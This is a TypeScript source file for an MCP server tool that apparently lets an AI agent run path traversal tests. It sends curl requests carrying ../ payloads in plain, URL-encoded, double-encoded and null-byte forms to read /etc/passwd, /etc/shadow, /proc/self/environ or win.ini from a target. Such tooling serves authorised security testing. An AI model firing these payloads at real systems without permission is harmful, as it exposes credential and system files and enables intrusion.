/**
 * Path Traversal testing tools.
 */

import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { z } from "zod";
import { runCmd, requireTool } from "../runner.js";

export function register(server: McpServer): void {
  server.tool(
    "path_traversal_test",
    "Test path traversal with encoding variants at multiple depths. Tries plain ../, URL-encoded %2e%2e/, double-encoded %252e%252e/, and null-byte/truncation bypasses. Returns results array with payload, status, length, contains_target per attempt, and vulnerable_payloads list. Side effects: Read-only GET requests. Sends ~32 requests.",
    {
      url: z.string().describe("URL with file parameter, e.g. https://target/image?filename=photo.jpg"),
      parameter: z.string().describe("Parameter that accepts filenames"),
      target_file: z.string().optional().describe("Server file to attempt reading"),
      depth: z.number().min(1).max(12).optional().describe("Maximum directory traversal depth"),
    },
    async ({ url, parameter, target_file = "/etc/passwd", depth = 8 }) => {
      requireTool("curl");
      const baseUrl = url.split("?")[0];

      // Determine what to look for in the response
      const targetIndicators: Record<string, string[]> = {
        "/etc/passwd": ["root:", "nobody:", "/bin/bash", "/bin/sh"],
        "/etc/shadow": ["root:", "$6$", "$y$"],
        "/proc/self/environ": ["PATH=", "HOME=", "USER="],
        "/windows/win.ini": ["[fonts]", "[extensions]"],
      };
      const indicators = targetIndicators[target_file] ?? [target_file.split("/").pop() ?? target_file];

      type EncodingFn = (d: number, f: string) => string;
      const encodingVariants: Array<[string, EncodingFn]> = [
        ["plain", (d, f) => "../".repeat(d) + f.replace(/^\//, "")],
        ["url_encoded", (d, f) => "%2e%2e/".repeat(d) + f.replace(/^\//, "")],
        ["double_encoded", (d, f) => "%252e%252e%252f".repeat(d) + f.replace(/^\//, "")],
        ["null_byte", (d, f) => "../".repeat(d) + f.replace(/^\//, "") + "%00.jpg"],
      ];

      const results = [];
      const vulnerable: string[] = [];

      for (const depthVal of [3, 5, depth]) {
        for (const [encName, encFn] of encodingVariants) {
          const payload = encFn(depthVal, target_file);
          const res = await runCmd("curl", [
            "-sk",
            "-o", "-",
            "-w", "\n__META__%{http_code}:%{size_download}",
            `${baseUrl}?${parameter}=${payload}`,
          ]);

          let body = res.stdout;
          const metaMarker = body.lastIndexOf("__META__");
          let status = 0;
          let length = 0;
          if (metaMarker !== -1) {
            const meta = body.slice(metaMarker + 8).trim();
            const parts = meta.split(":");
            status = parts.length > 0 ? parseInt(parts[0], 10) : 0;
            length = parts.length > 1 ? parseInt(parts[1], 10) : 0;
            body = body.slice(0, metaMarker);
          }

          const contains = indicators.some((ind) => body.includes(ind));
          const entry = {
            encoding: encName,
            depth: depthVal,
            payload,
            status,
            length,
            contains_target: contains,
          };
          results.push(entry);
          if (contains) {
            vulnerable.push(payload);
          }
        }
      }

      const result = {
        target_file,
        results,
        vulnerable_payloads: vulnerable,
        vulnerable: vulnerable.length > 0,
      };
      return { content: [{ type: "text" as const, text: JSON.stringify(result, null, 2) }] };
    }
  );
}
